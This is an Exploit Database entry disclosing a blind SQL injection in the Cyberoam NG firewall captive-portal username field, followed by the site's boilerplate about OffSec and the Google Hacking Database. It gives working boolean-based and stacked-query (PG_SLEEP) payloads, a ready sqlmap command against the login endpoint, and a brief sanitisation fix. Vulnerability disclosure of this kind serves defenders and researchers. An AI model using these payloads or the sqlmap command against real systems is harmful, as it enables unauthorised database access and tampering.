# Exploit Title: Cyberoam : Blind SQL Injection
# Date: 31/Aug/2015
# Exploit Author: Dharmendra Kumar Singh
# Contact: dsingh63@outlook.com
# Vendor Homepage: http://www.cyberoam.com
# Software Link: http://www.cyberoam.com/NGFW/
# Version: CR500iNG-XP - 10.6.2 MR-1
# Category: Firewall

1. Description

The username field in the captive portal of Cyberoam NG firewall is vulnerable to SQL Injection and can be exploited to execute sql commands on the database.

The username field is vulnerable to the following types of SQL Injections

a) Boolean-based blind sql injection
b) Stacked queries

2. Proof of Concept

The data send to the server while logging in through the captive portal is like "mode=191&username=cyberuser&password=cyberpass&a=1439886198757&producttype=0"
The query generated in backend server must be something like this
SELECT password FROM table_name WHERE username = 'cyberuser'

a) Boolean-based blind sql injection
If a valid username/password combination is known than boolean-based blind sql injection can be done. If username is set to cyberuser' AND 'x'='x , data send will be "mode=191&username=cyberuser' AND 'x'='x&password=cyberpass&a=1439886198757&producttype=0"
And sql query will become

SELECT password FROM table_name WHERE username = 'cyberuser' AND 'x'='x'
A successfull login message will be received in response in this case. But if username is set to cyberuser' AND 'x'='y than login fail message will be received in response, since x is not equal to y, hence this confirms that username field is vulnerable to boolean-based blind sql injection

b) Stacked queries
if username is set to cyberuser';SELECT PG_SLEEP(5) --  the resultant sql query will become
SELECT password FROM table_name WHERE username = 'cyberuser';SELECT PG_SLEEP(5) -- '
The stacked sql query "SELECT PG_SLEEP(5)" will make the current session’s process sleep until 5 seconds have elapsed. This confirms that Postgresql Server is used and stacked queries can be executed by providing crafted input to username field.

3. Exploit

Since the techniques are blind hence it is recommended to use an automated tool like SQLMap to exploit the vulnerability. The following command can be used to initiate the exploit
sqlmap.py -u "http://example.com:8090/login.xml" --data "mode=191&username=cyberuser&password=cyberpass&a=1439886198757&producttype=0"

4. Solution

The backend server scripts do not sanitize user-supplied data before using it in the SQL query. Hence by properly sanitizing the data received in GET variable "username", the vulnerability can be patched.

5. Conclusion

The Cyberoam NG Firewall devices <= Version: CR500iNG-XP - 10.6.2 MR-1 are vulnerable to blind SQL Injection and this vulnerability can be exploited by an attacker to compromise the application, access or modify data

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
